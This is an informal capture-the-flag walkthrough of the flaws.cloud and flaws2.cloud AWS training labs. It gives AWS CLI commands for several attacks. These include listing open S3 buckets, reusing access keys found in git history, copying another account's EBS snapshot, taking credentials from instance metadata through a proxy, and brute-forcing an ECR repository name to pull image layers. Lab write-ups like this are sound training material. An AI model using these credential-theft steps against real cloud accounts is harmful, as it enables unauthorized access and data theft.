# `FLAWS.CLOUD`

# Level 1

```
http://flaws.cloud
```

Go to flaws.cloud and start enumerating

`Grabbing the ip address of flaws.cloud`

```
host flaws.cloud
```

`Querying the webserver`

```
nslookup 52.218.212.163
```

I found that the website is hosted in an AWS S3 Bucket named "s3-website-us-west-2.amazonaws.com".

Prepended the domain name with the bucket name as due AWS to documentation, every s3.bucket has a unique global name space.

Verified that: flaws.cloud.s3-website-us-west-2.amazonaws.com does indeed go to the flaws.cloud website

So, going into flaws.cloud.s3.amazonaws.com takes you to a site that gives you the bucket content in an XML data format. One of the json keys is a "very interesting page" to say the least. Append that to end of the current url and voila!
<br><br><br>

# Level 2

```
http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
```

The default hint is the "you will need your own AWS account for this". So this should tell you that this will happen within the AWS environment (although full disclaimer I did hit upto Hint2 to get to the Flag). The steps below demostrates commands I've used within Kali's terminal, in hind sight though... would have been a lot easier if I've done it within my AWS CloudShell.

From Kali terminal, configure your aws cli

```
aws configure
(enter your AWS creds)
```

Once configured, you can start traversing the Level2 bucket with:

```
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
```

Using the last step in Level1, One of the content is a "very interesting html page". Append that to end of the current url and voila!

## Pivot to CloudSheel

As I've stated, this would have been easier (or is it?) within the AWS CloudShell environment.

1. Login to your AWS 'IAM' account
2. Go to S3
3. Go to CloudShell
4. Invoke this command (aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/)
   <br><br><br>

# Level 3

```
http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
```

This level talks about a key and it says I will find something that will list other buckets (pfft, yeah right!)

Well first step, lets grab the content of this level

```
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
```

The output shows a hidden folder named .git, so version control is 'enabled' in this bucket. After hours of googling, I found that I need to copy folder so I can see the older version of the files.

```
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/Documents/Level3
```

So now, I have a copy of the bucket contents... let's see if the lower version has something interesting... back to google "how to download git version"

Alright, let's look at the git log

```
git log
```

Hahaha, he basically had a commit message of "Oops, accidentally added something I shouldn't have"... so let's have a look.

```
git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```

Because I changed the files/folders, let's see what we have now!

```
ls -la
(a new file!)
cat access_keys.txt
```

He has given us another user's access keys. Let's use that shit.

```
aws configure
(use new creds)
```

Then let's traverse 'his' bucket

```
aws s3 ls
```

Wow! We have all of it till Level6 hahaha! But let's be a good boy and just go to Level 4 for now.
<br><br><br>

# Level 4

Ok... after 7.5hrs, I've finished Level 4. Here is how I did it.
Level 4 lives in an EC2 instance (yep! new learning curve). With the same credentials from Level 3 grab the snapshot credentials of this EC2 instanance.

Step 1: Configure AWS CLi

```
aws configure
(use level 3 creds, dont forget to enter region us-west-2)
```

Step 2: Grab L3's UserID

```
aws sts get-caller-identity
```

Step 3: Look at the Snapshot Creds

```
aws ec2 describe-snapshots --owner-id 975426262029
```

After this, it's a long walk teaching myself to launch an EC2 instance using this snapshot information. But here are the steps:

1. From your own AWS EC2 Cloudshell, create a volume which is a copy of the snapshot you just found.

```
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
```

2. Remember these important things so you wont fall into the same rabbit hole. Your EC2 instance, should be in US-WEST-2.
3. In your EC2 console, go to volume. From the volume you've just created, create a new snapshot of that volume.
4. Go to your Snapshots > and then create an image from that snapshot
5. Go to AMIs > and then launch an instance using that image. Just use default free tier values.
6. Important! ~ before the end, in Step 6: Configure Security Group"... make sure to create your own SSH keys so you can login into this instanace. Download that shit and save that baby for later.
7. Connect to your instance using your own terminal (not the AWS cloudshell)
8. traverse the directors (ls), and then...

```
cat setupNginx.sh
```

9. Boom! Wasted 7.5hrs of my life... but totally worth it!
   <br><br><br>

# Level 5

Can't believe it only took me 2hrs for this one. Must be credit to the time spent in Level4 hahaha.
The aim of this level is to traverse proxy doamins that points to the same ec2 instance. Hint1 provided a crucial information about RFC-3927 of the instance metadata (oh thank go I paid attention to Stephane Maarek's course). This info in hand, I know that I am looking for metadata from all these proxy sites.

This is actually the bulk of the time spent in this level. Level 5 has 3 proxies and each have a lot of folders.

Eventually you will find an IAM folder in http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud, dig in a litte deeper and you will find NEW creds with a session token.

! important ~ you need to be in the EC2 instance while doing all this. If that is vague for you - fucken SSH into the instance using your Level4 creds.

Rabbit hole alert - I have the creds but i keep getting auth errors... time for hint 2!

Aha! you cant just do a

```
aws configure
```

well you can actually, but after that go to your aws folder (this is what i used to find it)

```
locate aws
```

and append the token with key name `aws_session_token`. Now, dont be stupid, delete them quotes... this is not a json file! (that is exactly what i told myself)

Once you have that, if you go back to the first page of Level 5 before the hint... it tells you that you will use this to find the hidden content of level 6. So i did:

```
aws --profile WHATEVER s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
```

You will then see that there are only two pages inside this bucket, one is the index.html and the other is??? what??? You do the math!


<br><br><br>
<br><br><br>

# `FLAWS2.CLOUD`

# `Defender Track`

http://flaws2.cloud/defender.htm

<br><br><br>

# `Attacker Track`

<br>

# Level 1

1. From the first page (dont click hint yet!) inspect the form using your browser's developer tools. You will see that the html form tag actually contains the API link where the form values will be submitted.
2. Use the link that you found and pass on the code value

   ```
   link?code=1234
   ```

3. While I tried this should be the right way of things... I felt cheated as you will NEVER gonna get to the right link unless you've clicked the hint.
4. Click the hint. Read the statement CAREFULLY!!!
5. There is TRICK in the statement, while I've generated the some JSON data from just trying out a few values (and yes i tried a 100-char value), the next step is very ambigous. His statement is: `Get around it and pass a pin code that isn't a number`
   - he meant the letter a as the pin code literally
   - and again, I believe (or maybe i'm just ranting coz i suck) you cannot get to the next step unless you get this hint
6. Finally, after all that rant... pass in the link that you got from the HTML form tag with the code value a

   ```
   link?code=a
   ```

   Stupid right?

7. Then you will be sent to a page with a json data dump. Note that you will see different output depending with the browser that you are using. If you are using chrome, you will see the raw data dump right away... if you are using firefox... dont cry!... just click the RAW DATA tab to see the json raw data.
8. Because you and I are not robots, unless you are awesome at reading one-liners... go to https://www.beautifyjson.org/ >> paste the raw data and you will see that the API dumped you some AWS credentials
9. In your terminal, configure this user using:

   ```
   aws configure --profile name
   ```

   and enter the access key id and access secret key... because you got a session token, you might as well enter this in your credential file within your aws folder. (if you dont know how to do this, check out FLAWS1 Level5).

10. While I did say to do it, I just realised that you dont need it to view the directory content of the S3 bucket.
11. View the bucket using:

   ```
   aws s3 ls s3://level1.flaws2.cloud
   ```

Voila!

<br><br><br>

# Level 2

1. Right let's spin this DJ! So clicked into first hint and found out that this is an ECR. Went back to Stephane Maarek's course and re-learned the ECR modules.
2. To use the command in the HINT, we will need two things...
   - 1st is the --registry-id (thankfully we've done this in FLAWS1)
   - 2nd the name of the repo (since there isn't anymore hints after the 1st one, it could be deliberate) we will brute force this with the help of BurpSuite
3. Using the user account details from Level 1 (FLAWS2)... we will issue the command:
   ```
   aws --profile 2L1V2 sts get-caller-identity
   ```
   then the output should be a json data format with:
   ```
   {
       "UserId": "AROAIBATWWYQXZTTALNCE:level1",
       "Account": "653711331788",
       "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
   }
   ```
4. Great! We now have the (key) --registry-id value. Now let's bruteforce (I'm trying to make it sound cool but all I'm doing is using Burp Intruder to trial and error a few words)
5. Go to AWS CLI
6. Make sure you proxy is set to burp >> Intercept off
7. Run an initial call from the AWS CLI (cloudshell) so that you can capture the POST requests and manipulate the data
8. Key in payload in intruder (repo, flaws2.cloud, flaws2, level1, level2, level2_flaws2, flaws2level2, flaws2_level2)
9. As it turns out, I am not entirely so unlucky!!! I hit jackpot on the 5th key:value pair (winning!)
10. So... we now know the repo's name is level2... let's run the command from the hint:
    ```
    aws ecr list-images --repository-name level2 --registry-id 653711331788 --profile 2L1V2
    ```
    we will then get the image hash
    ```
    {
        "imageIds": [
            {
                "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
                "imageTag": "latest"
            }
        ]
    }
    ```
11. Let's go back to Stephane's course module... ok! Because I do not understand docker (dont judge!)... we will use cloudshell
12. The AWS CLI ECR documentation comes in handy... lots of reading, lots of trying to understand shit (atleast pretending)
13. Let's invoke this command
    ```
    aws --profile 2L1V2 ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest
    ```
14. Right-o! We are getting somewhere... we got a json data dump again...
    ```
    {
        "images": [
            {
                "registryId": "653711331788",
                "repositoryName": "level2",
                "imageId": {
                    "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
                    "imageTag": "latest"
                },
                "imageManifest": "{\n   \"schemaVersion\": 2,\n   \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\",\n   \"config\": {\n      \"mediaType\": \"application/vnd.docker.container.image.v1+json\",\n      \"size\": 5359,\n      \"digest\": \"sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621\"\n   },\n   \"layers\": [\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 43412182,\n         \"digest\": \"sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 848,\n         \"digest\": \"sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 619,\n         \"digest\": \"sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 168,\n         \"digest\": \"sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 32516034,\n         \"digest\": \"sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 217,\n         \"digest\": \"sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 619,\n         \"digest\": \"sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 893,\n         \"digest\": \"sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 508,\n         \"digest\": \"sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac\"\n      },\n      {\n         \"mediaType\": \"application/vnd.docker.image.rootfs.diff.tar.gzip\",\n         \"size\": 213,\n         \"digest\": \"sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935\"\n      }\n   ]\n}",
                "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json"
            }
        ],
        "failures": []
    }
    ```
15. Again, I am not a robot... let's pull up https://www.beautifyjson.org/ and prettify this json data
16. So we now have the imageDigest key and hashed value... let's look into https://docs.aws.amazon.com/cli/latest/reference/ecr/get-download-url-for-layer.html
17. Let's try and download each one and see if we get something cool:

    ```
    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e6797d1788acd741d33f4530106586ffee568be513d47e6e20a4c9bc3858822e" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e25c5c290bded5267364aa9f59a18dd22a8b776d7658a41ffabbf691d8104e36" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:96af0e137711cf1b2bf6e95528fbf861b2beef58c382bdadcf8062851e7005bb" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:2057ef5841b5bc57c66088d7d99898e6b7a516feaf2e66a7a4c69e6b40a03472" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:e4206c7b02ec71b1262ad18216e1203da19e5292fcf636392e0ed969871bb235" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:501f2d39ea313392ab1e2b4b6b7d9213c60335d3c508fc02b3bdae9792ae2d32" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:f90fb73d877d9ce2e2220a1340d2e347b0c7baa2d120ce02c8731d666cdb1cac" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935" --repository-name level2 --registry-id 653711331788

    aws --profile 2L1V2 ecr get-download-url-for-layer --layer-digest "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e" --repository-name level2 --registry-id 653711331788
    ```

18. Because I am evil, I also wish you to suffer as I have when I called each one of this files... you will later find out (as I did) that you only need the one that is not a tar.gzip file :joy: ...
19. In the ocean of data inside that you just opened (and once you prettify that data)... you will see something curious that says password!!! hahaha... I won't spoil it... go and find it!
20. Ok... you might be asking yourself... I have a username and a password... what next? A great man once said "when lost, it is wise to start from the beginning"
21. That's right, there is a link from the beginning of Level 2 where you will plug that creds in.

`Note:` I would like to add how proud I am with myself in performing Level2... I did this with nothing but a hint that it is using the ECR technology of AWS... everything else is based on the AWS course modules and the AWS CLI documentation. I would also like to stress the importance of reading this documentation. I think it is impossible to interact with the AWS CLI without this document.

`Edit` I found that my proxy was causing the 404... there are indeed a good number of hints for Level 2... I did not retract my first NOTE because I am still proud that I did the whole Level 2 without looking at any of them.
